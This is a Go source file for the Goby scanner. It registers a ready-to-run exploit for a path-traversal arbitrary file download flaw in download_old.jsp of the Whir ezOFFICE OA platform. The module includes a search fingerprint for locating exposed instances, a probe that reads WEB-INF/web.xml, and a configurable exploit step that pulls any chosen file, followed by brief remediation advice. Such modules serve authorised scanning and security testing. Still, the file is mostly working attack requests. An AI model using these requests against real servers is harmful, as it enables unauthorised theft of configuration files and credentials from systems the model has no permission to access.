package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ezOFFICE  download_old.jsp Arbitrary File Download Vulnerability",
    "Description": "<p>ezOFFICE collaborative management platform download_old.jsp FileName parameter has a file download vulnerability.Attackers can use this vulnerability to download sensitive files on the server, obtain sensitive information, cause further attacks, and lead to server collapse.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2022-12-02",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "(title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\")",
    "GobyQuery": "(title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\")",
    "Level": "3",
    "Impact": "<p>ezOFFICE collaborative management platform download_old.jsp FileName parameter has a file download vulnerability.Attackers can use this vulnerability to download sensitive files on the server, obtain sensitive information, cause further attacks, and lead to server collapse.</p>",
    "Recommendation": "<p>1. Before downloading, filter the incoming parameters, and directly replace.. With null to simply achieve the purpose of prevention;</p><p>2. Check the download file type to determine whether the download type is allowed;</p><p>3. Upgrade to the latest version.</p>",
    "References": [
        "https://github.com/cflq3/poc/blob/master/bugscan/exp-1406.py"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../../WEB-INF",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/public/download/download_old.jsp?path=a/../../WEB-INF&name=x&FileName=web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app xmlns=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<servlet-name>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/public/download/download_old.jsp?path=a/{{{path}}}&name=x&FileName={{{filename}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE 协同管理平台 download_old.jsp 文件 FileName 参数文件下载漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户 ezOFFICE 协同管理平台 /defaultroot/download_old.jsp 文件 FileName 参数文件下载漏洞，攻击者可以利用此漏洞下载服务器上的敏感文件，获取敏感信息，造成进一步的攻击，导致服务器沦陷。<br></p>",
            "Recommendation": "<p>1、在下载前对传入的参数进行过滤，直接将..替换成空，就可以简单实现防范的目的；</p><p>2、对下载文件类型进行检查，判断是否允许下载类型；</p><p>3、升级至最新版本。</p>",
            "Impact": "<p>万户 ezOFFICE 协同管理平台 /defaultroot/download_old.jsp 文件 FileName 参数文件下载漏洞，攻击者可以利用此漏洞下载服务器上的敏感文件，获取敏感信息，造成进一步的攻击，导致服务器沦陷。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ezOFFICE  download_old.jsp Arbitrary File Download Vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>ezOFFICE collaborative management platform download_old.jsp FileName parameter has a file download vulnerability.Attackers can use this vulnerability to download sensitive files on the server, obtain sensitive information, cause further attacks, and lead to server collapse.<br></p>",
            "Recommendation": "<p>1. Before downloading, filter the incoming parameters, and directly replace.. With null to simply achieve the purpose of prevention;</p><p>2. Check the download file type to determine whether the download type is allowed;</p><p>3. Upgrade to the latest version.</p>",
            "Impact": "<p>ezOFFICE collaborative management platform download_old.jsp FileName parameter has a file download vulnerability.Attackers can use this vulnerability to download sensitive files on the server, obtain sensitive information, cause further attacks, and lead to server collapse.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
